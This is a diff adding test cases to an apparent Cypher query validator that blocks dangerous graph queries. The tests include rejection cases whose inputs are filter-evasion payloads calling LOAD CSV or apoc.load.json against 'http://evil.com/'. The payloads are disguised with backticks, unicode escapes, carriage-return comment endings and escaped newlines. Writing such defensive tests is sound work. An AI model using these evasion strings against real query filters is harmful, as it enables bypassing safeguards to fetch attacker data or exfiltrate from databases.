@@ -227,6 +227,14 @@ class TestProtection:
         result = inject_provider_label(cypher, PROVIDER_ID)
         assert f"(n:AWSRole:{LABEL})" in result
 
+    def test_carriage_return_ends_a_line_comment(self):
+        cypher = "RETURN 1 // note\rMATCH (n:AWSRole) RETURN n"
+        result = inject_provider_label(cypher, PROVIDER_ID)
+        assert f"(n:AWSRole:{LABEL})" in result
+
+    def test_escaped_backslash_before_u_in_string_is_allowed(self):
+        validate_custom_query("MATCH (n:AWSRole) WHERE n.path = 'C:\\\\users' RETURN n")
+
     def test_block_comment_with_node_pattern(self):
         cypher = "MATCH (n:AWSRole) /* (m:Fake)\n(k) */ RETURN n"
         result = _inject(cypher)
@@ -493,6 +501,11 @@ class TestValidation:
             " YIELD graph RETURN graph",
             "L\\u004fAD CSV FROM 'http://evil.com/' AS x RETURN x",
             "RETURN 'a\\u0027 LOAD CSV FROM \"http://evil.com/\" AS x RETURN x //'",
+            "WITH 1 AS `a`LOAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "CALL`apoc`.`load`.json('http://evil.com/') YIELD value RETURN value",
+            "L\\u+004fAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "RETURN 1 // note\rLOAD CSV FROM 'http://evil.com/' AS x RETURN x",
+            "RETURN 'a\\\n' LOAD CSV FROM \"http://evil.com/\" AS x RETURN x //'",
         ],
         ids=[
             "apoc.load_backticked_namespace",
@@ -503,6 +516,11 @@ class TestValidation:
             "apoc.graph.fromCypher",
             "LOAD_CSV_spelled_with_unicode_escape",
             "string_closed_by_unicode_escape",
+            "LOAD_CSV_glued_to_backtick_identifier",
+            "apoc.load_backticked_glued_to_CALL",
+            "LOAD_CSV_spelled_with_signed_unicode_escape",
+            "LOAD_CSV_after_line_comment_ended_by_carriage_return",
+            "LOAD_CSV_after_string_with_escaped_newline",
         ],
     )
     def test_rejects_blocked_patterns_hidden_by_backticks_or_nested_queries(
